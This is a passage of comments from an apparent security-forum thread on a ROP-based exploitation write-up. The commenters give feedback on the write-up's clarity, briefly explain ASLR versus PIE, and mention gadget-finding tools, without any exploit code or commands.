<li>It felt like you wanted to make it beginner friendly and tried to explain things carefully even citing how certain functions work. That‚Äôs good! But sometimes some explanations were missing for me.<br>
=&gt; E.g. for someone whos not fit in gdb he most likely has not installed gdb-peda. A link or something like a ‚Äúressources‚Äù section would have fit nicely there. Since as to my knowledge ‚Äúnormal‚Äù gdb does not offer vmmap. so for him he‚Äôd be kinda confused confused here.</li>
<li>Headers would have made the formatting a bit easier to follow.<br>
=&gt; e.g. ‚ÄúLooking for a Vuln.‚Äù, ‚ÄúBuilding the exploit‚Äù, ‚Ä¶</li>
<li>also the first command using scp didn‚Äôt work for me as displayed in the first try. switching to ssh did tho. Not sure if that‚Äôs a problem at my end right now tho.</li>
</ul>
<p>I‚Äôm looking forward to future posts from you.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T09:57:44Z" class="post-time">
April 28, 2017, 9:57am
</time>
<meta itemprop="dateModified" content="2017-04-28T09:57:44Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/vvid0w">@VVid0w</a> <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a>: Though I completely understand where you are coming from and I personally strive to always make my write-ups beginner friendly and technical at the same time, you have to see it from a different perspective as well.</p>
<p>What you are essentially saying is that <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> should include an english tutorial in his write-up as well (assuming that his english are perfect). I wish every technical paper had an intro section as well to get me up to speed but the truth is, it‚Äôs called technical for a reason. Imagine if every RE/Malware book included an intro to programming as well. The same applies for CVE‚Äôs.</p>
<p>Just to be clear, I completely see your points. But, there are 2 perspectives:</p>
<ul>
<li>See it as lack of information.</li>
<li>See it as motivation for further research.</li>
</ul>
<p>No hate,<br>
Peace and love.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:35:05Z" class="post-time">
April 28, 2017, 10:35am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:35:05Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="_py" data-post="5" data-topic="1937">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar"> _py:</div>
<blockquote>
<p><a class="mention" href="https://0x00sec.org/u/vvid0w">@VVid0w</a> <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a>: Though I completely understand where you are coming from and I personally strive to always make my write-ups beginner friendly and technical at the same time, you have to see it from a different perspective as well.</p>
</blockquote>
</aside>
<p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> , you‚Äôre correct with what you‚Äôre stating about technical papers and other publications.<br>
Maybe we need something like a tag here in the forum which is either [beginner friendly] or [intermediate] for articles with ‚Äúmotivation for further research‚Äù as you call it. This would make writing articles for different target groups more easy ( at least visually ).<br>
But in general it was no hate against <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> at all. He wrote a good article there‚Äôs nothing to argue about that <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> .</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:39:04Z" class="post-time">
April 28, 2017, 10:39am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:39:04Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> You are right on that. We don‚Äôt really need a tag, but it‚Äôd save a lot of the reader‚Äôs time if every author states at the beginning what should be expected in terms of theory etc.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:48:16Z" class="post-time">
April 28, 2017, 10:48am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:55:45Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> then maybe it‚Äôs time to create a rough template or some writing guidelines and pin them to the top?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:53:35Z" class="post-time">
April 28, 2017, 10:53am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:53:35Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/oaktree">@oaktree</a> <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> he‚Äôs got a point.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/johnt"><span itemprop="name">johnt</span></a>
(johnt)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:54:12Z" class="post-time">
April 28, 2017, 10:54am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:54:12Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You beat that challenge without using ROPgadget ? I respect that <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:57:51Z" class="post-time">
April 28, 2017, 10:57am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:57:51Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>He used <a href="https://github.com/sashs/Ropper">Ropper</a> which does basically the same <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/johnt"><span itemprop="name">johnt</span></a>
(johnt)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T10:59:20Z" class="post-time">
April 28, 2017, 10:59am
</time>
<meta itemprop="dateModified" content="2017-04-28T10:59:20Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I meant ‚Äúropgadget --ropchain‚Äù <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T12:52:29Z" class="post-time">
April 28, 2017, 12:52pm
</time>
<meta itemprop="dateModified" content="2017-04-28T12:52:29Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you guys for feedback <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:">, I really appreciate this. Thank you guys <img src="../../images/emoji/twitter/heart.png%3Fv=9" title=":heart:" class="emoji" alt=":heart:"> !</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T15:10:00Z" class="post-time">
April 28, 2017, 3:10pm
</time>
<meta itemprop="dateModified" content="2017-04-28T15:10:00Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> Is <a href="https://www.0x00sec.org/t/post-coherency-and-adherence-to-good-english/503">this</a> what you mean?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T15:12:46Z" class="post-time">
April 28, 2017, 3:12pm
</time>
<meta itemprop="dateModified" content="2017-04-28T15:12:46Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a> That is more of a syntactical/formatting guideline. We‚Äôll add further info on that one (or make a fresh one) and pin it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Veer_Abhimanyu"><span itemprop="name">Veer_Abhimanyu</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-11-15T12:43:03Z" class="post-time">
November 15, 2017, 12:43pm
</time>
<meta itemprop="dateModified" content="2017-11-15T12:43:03Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I see that ASLR is enabled using /proc/sys/kernel/randomize_va_space<br>
But my doubt is that how are the addresses of gadgets being same even after running many times ?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-11-15T15:26:58Z" class="post-time">
November 15, 2017, 3:26pm
</time>
<meta itemprop="dateModified" content="2017-11-15T20:34:53Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>There is <strong>system</strong> ASLR where only libc‚Äôs base address is randomized and there‚Äôs also <strong>full</strong> ASLR which randomizes the address space of the binary itself (i.e gadget addresses as you mentioned), aka PIE (google gcc‚Äôs -fPIE flag).</p>
<p>In <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a>‚Äôs case, only libc‚Äôs base address was randomized and thus the gadgets had the same address in each execution since they were in the text segment area of the binary and not inside libc.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/trickster0"><span itemprop="name">trickster0</span></a>
(trickster0)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-11-15T20:49:03Z" class="post-time">
November 15, 2017, 8:49pm
</time>
<meta itemprop="dateModified" content="2017-11-15T20:49:03Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> Hey man, i noticed that you post some great exploit dev tutorials.<br>
I have been trying to tackle the challenge from root-me about the x86 kernel bof.<br>
I would love to see a tutorial about that, to learn a few things.<br>
I am looking forward to it, if you have any time to solve it and write a couple of stuff here.<br>
thx in advance</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-11-15T21:47:05Z" class="post-time">
November 15, 2017, 9:47pm
</time>
<meta itemprop="dateModified" content="2017-11-15T21:47:05Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/trickster0">@trickster0</a> Happy you learnt something <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:">! And i‚Äôll do my best to write about Kernel BOF once i find some freetime. <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Veer_Abhimanyu"><span itemprop="name">Veer_Abhimanyu</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-11-16T04:02:35Z" class="post-time">
November 16, 2017, 4:02am
</time>
<meta itemprop="dateModified" content="2017-11-16T08:38:22Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>how does the author come to know that the function mprotect takes arguements from those particular registers ( rdi ,rsi , rdx ) !!??</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="1937%3Fpage=2.html">next page ‚Üí</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
